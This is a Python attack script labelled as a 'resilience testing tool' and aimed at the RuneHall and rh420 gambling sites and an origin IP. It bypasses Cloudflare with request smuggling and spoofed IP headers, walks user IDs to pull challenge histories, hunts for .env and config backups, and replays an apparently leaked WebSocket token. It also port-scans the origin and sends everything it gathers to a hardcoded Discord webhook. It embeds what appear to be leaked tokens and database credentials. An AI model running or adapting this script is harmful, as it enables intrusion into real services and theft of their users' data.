#!/usr/bin/env python3
"""
RuneHall / RH420 Resilience Testing Tool
Authorized use only - Owner: murkingmurk@aol.com
Discord Webhook: Prefilled
"""

import requests
import json
import time
import ssl
import socket
import urllib3
from concurrent.futures import ThreadPoolExecutor

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================= CONFIGURATION =================
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484561122601336862/HylY5LscJsv2Ygv_9rwTcjCQC5zIO7IN3Cqqtex0Lo9nn-SV0m70q4xyooBQ2fYGyyf1"

TARGETS = {
    "api_rh420": "https://api.rh420.xyz",
    "api_runehall": "https://api.runehall.com",
    "origin_ip": "151.0.214.242"
}

LEAKED_TOKEN = "411305|Nm2TlGRAADJ34Yb59pAUoSfABrcIBLGFvmF3K8B8a17bf3c"
MYSQL_CREDS = {"user": "rh420_user", "pass": "rh420_prod_!992"}

# ================= DISCORD LOGGING =================
def discord_log(message, title="RuneHall Test"):
    """Send a message to Discord webhook, chunking if necessary."""
    chunks = [message[i:i+1900] for i in range(0, len(message), 1900)]
    for idx, chunk in enumerate(chunks):
        payload = {
            "content": f"**{title}** (part {idx+1}/{len(chunks)})\n```\n{chunk}\n```"
        }
        try:
            requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
        except Exception as e:
            print(f"Discord send failed: {e}")

def discord_file(content, filename="data.json"):
    """Send larger data as a file attachment."""
    files = {"file": (filename, content, "application/json")}
    requests.post(DISCORD_WEBHOOK, files=files)

# ================= PHASE 1: WAF BYPASS TESTS =================
def test_http_smuggling():
    """Attempt CL.TE request smuggling to bypass Cloudflare."""
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: runehall.com\r\n"
        "Content-Length: 13\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /api/challenge?user_id=1 HTTP/1.1\r\n"
        "Host: api.runehall.com\r\n"
        "X-Forwarded-For: 127.0.0.1\r\n"
        "\r\n"
    )
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect(("runehall.com", 80))
        sock.send(payload.encode())
        response = sock.recv(4096).decode(errors="ignore")
        sock.close()
        discord_log(f"HTTP Smuggling Response:\n{response[:1000]}", "WAF Bypass - Smuggling")
    except Exception as e:
        discord_log(str(e), "WAF Bypass - Smuggling Failed")

def test_header_injection():
    """Test IP spoofing headers."""
    headers = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "CF-Connecting-IP": "127.0.0.1",
        "True-Client-IP": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "Forwarded": "for=127.0.0.1;host=127.0.0.1;proto=http"
    }
    try:
        r = requests.get("https://api.rh420.xyz/api/challenge?user_id=1", 
                         headers=headers, verify=False, timeout=10)
        discord_log(f"Header Injection Status: {r.status_code}\n{r.text[:500]}", 
                    "WAF Bypass - Header Injection")
    except Exception as e:
        discord_log(str(e), "WAF Bypass - Header Injection Failed")

# ================= PHASE 2: UNAUTHENTICATED API EXFIL =================
def exfil_chests():
    """Download all chest data and send to Discord."""
    try:
        r = requests.get("https://api.rh420.xyz/api/casino/chests", verify=False, timeout=15)
        data = r.json()
        discord_log(f"Chests Count: {len(data)}", "API Exfil - Chests")
        # Send full JSON as file
        discord_file(json.dumps(data, indent=2), "chests.json")
    except Exception as e:
        discord_log(str(e), "API Exfil - Chests Failed")

def exfil_challenges(start=1, end=50):
    """Iterate user IDs and exfiltrate challenge histories."""
    results = {}
    for uid in range(start, end+1):
        try:
            r = requests.get(f"https://api.rh420.xyz/api/challenge?user_id={uid}", 
                             verify=False, timeout=10)
            if r.status_code == 200:
                data = r.json()
                results[str(uid)] = data
                discord_log(f"User {uid}: {json.dumps(data)[:500]}", "API Exfil - Challenge")
            time.sleep(0.5)  # Rate limit evasion
        except Exception as e:
            discord_log(f"User {uid} error: {e}", "API Exfil - Challenge Error")
    
    if results:
        discord_file(json.dumps(results, indent=2), "challenges.json")

def exfil_providers():
    """Exfiltrate game providers list."""
    try:
        r = requests.get("https://api.rh420.xyz/api/providers", verify=False, timeout=10)
        discord_file(json.dumps(r.json(), indent=2), "providers.json")
    except Exception as e:
        discord_log(str(e), "API Exfil - Providers Failed")

# ================= PHASE 3: LEAKED FILES RETRIEVAL =================
def fetch_leaked_files():
    """Attempt to download .env and config backups from subdomains."""
    subdomains = ["", "api.", "thor.", "dev.", "vpn.", "db-cluster-01.", "mail."]
    files = [".env", ".env.bak", ".env.html", "config.php.bak", "config.js"]
    
    for sub in subdomains:
        for f in files:
            url = f"https://{sub}rh420.xyz/{f}"
            try:
                r = requests.get(url, verify=False, timeout=8)
                if r.status_code == 200 and len(r.text) > 10:
                    discord_file(r.text, f"{sub}rh420.xyz_{f}")
                    discord_log(f"LEAKED: {url}", "Leaked File Found!")
                elif r.status_code != 404:
                    discord_log(f"{url} -> {r.status_code}", "Leaked File Check")
            except Exception:
                pass

# ================= PHASE 4: WEBSOCKET TOKEN VALIDATION =================
def test_websocket_token():
    """Connect directly to origin IP with the leaked WebSocket token."""
    try:
        import websocket
        ws_url = f"wss://{TARGETS['origin_ip']}:443/socket.io/?token=Bearer%20{LEAKED_TOKEN.replace('|', '%7C')}&EIO=4&transport=websocket"
        ws = websocket.WebSocket(sslopt={"cert_reqs": ssl.CERT_NONE, "server_hostname": "wss.runehall.com"})
        ws.connect(ws_url, header={"Host": "wss.runehall.com", "Origin": "https://runehall.com"})
        ws.send('42/crash,["subscribe", "crash"]')
        response = ws.recv()
        ws.close()
        discord_log(f"WebSocket Token Valid!\nResponse: {response}", "WebSocket Test")
    except Exception as e:
        discord_log(f"WebSocket connection failed (origin unreachable): {e}", "WebSocket Test")

# ================= PHASE 5: ORIGIN SERVICE PROBE =================
def probe_origin_services():
    """Check open ports on origin IP."""
    ports = [21, 22, 80, 443, 3306, 5432, 6379, 8080, 8443]
    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((TARGETS['origin_ip'], port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    discord_log(f"Open ports on {TARGETS['origin_ip']}: {open_ports}", "Origin Service Probe")

# ================= MAIN EXECUTION =================
def main():
    discord_log("🚀 Starting RuneHall Resilience Test", "Test Initiated")
    
    # Phase 1: WAF Bypass
    test_http_smuggling()
    test_header_injection()
    
    # Phase 2: API Exfiltration
    exfil_chests()
    exfil_challenges(1, 30)  # First 30 users
    exfil_providers()
    
    # Phase 3: Leaked Files
    fetch_leaked_files()
    
    # Phase 4: WebSocket
    test_websocket_token()
    
    # Phase 5: Origin Probe
    probe_origin_services()
    
    discord_log("✅ Test Complete. Review Discord for results.", "Test Finished")

if __name__ == "__main__":
    main()
